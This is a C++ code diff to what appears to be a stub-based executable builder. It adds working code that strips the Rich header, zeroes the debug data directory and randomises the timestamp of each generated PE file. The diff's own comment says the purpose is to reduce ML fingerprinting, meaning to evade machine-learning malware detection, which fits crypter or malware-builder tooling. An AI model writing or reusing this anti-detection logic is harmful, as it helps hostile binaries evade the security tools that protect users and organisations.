@@ -1316,6 +1316,52 @@ static void performBuild() {
     // Clean up temp stub file if it exists
     DeleteFileA(stubPath.c_str());
 
+    // Strip Rich header + zero debug data directory to reduce ML fingerprinting
+    {
+        HANDLE hFile = CreateFileA(destExe.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD lo, hi;
+            lo = GetFileSize(hFile, &hi);
+            if (lo > 0x400 && lo < 100 * 1024 * 1024) {
+                std::vector<BYTE> peData(lo);
+                DWORD read = 0;
+                ReadFile(hFile, peData.data(), lo, &read, nullptr);
+                if (read == lo && peData.size() >= 0x80 && peData[0] == 'M' && peData[1] == 'Z') {
+                    DWORD e_lfanew = *(DWORD*)(peData.data() + 0x3C);
+                    if (e_lfanew + 0x100 < peData.size() && *(DWORD*)(peData.data() + e_lfanew) == 0x00004550) {
+                        // Zero the Rich header (between DOS stub and PE header)
+                        DWORD richStart = 0x80;
+                        DWORD richEnd = e_lfanew;
+                        for (DWORD i = richStart; i < richEnd; i++)
+                            peData[i] = 0;
+
+                        // Zero debug data directory entry (offset 0xA8 for 64-bit, 0x98 for 32-bit)
+                        WORD machine = *(WORD*)(peData.data() + e_lfanew + 4);
+                        DWORD optHdrOff = e_lfanew + 24;
+                        WORD optMagic = *(WORD*)(peData.data() + optHdrOff);
+                        DWORD dataDirOff = optHdrOff + (optMagic == 0x20b ? 112 : 96); // PE32+ vs PE32
+                        DWORD numDataDirs = *(DWORD*)(peData.data() + optHdrOff + (optMagic == 0x20b ? 108 : 92));
+                        // Debug directory is index 6
+                        if (numDataDirs > 6 && dataDirOff + 6 * 8 + 8 <= peData.size()) {
+                            DWORD* dbgDir = (DWORD*)(peData.data() + dataDirOff + 6 * 8);
+                            dbgDir[0] = 0; // RVA
+                            dbgDir[1] = 0; // Size
+                        }
+
+                        // Randomize TimeDateStamp in COFF header
+                        DWORD randStamp = GetTickCount() ^ (DWORD)0x5A5A5A5A ^ (e_lfanew * 31);
+                        *(DWORD*)(peData.data() + e_lfanew + 8) = randStamp;
+
+                        SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
+                        DWORD written = 0;
+                        WriteFile(hFile, peData.data(), lo, &written, nullptr);
+                    }
+                }
+            }
+            CloseHandle(hFile);
+        }
+    }
+
     LARGE_INTEGER finalSize = {};
     HANDLE hCheck = CreateFileA(destExe.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
     if (hCheck != INVALID_HANDLE_VALUE) {
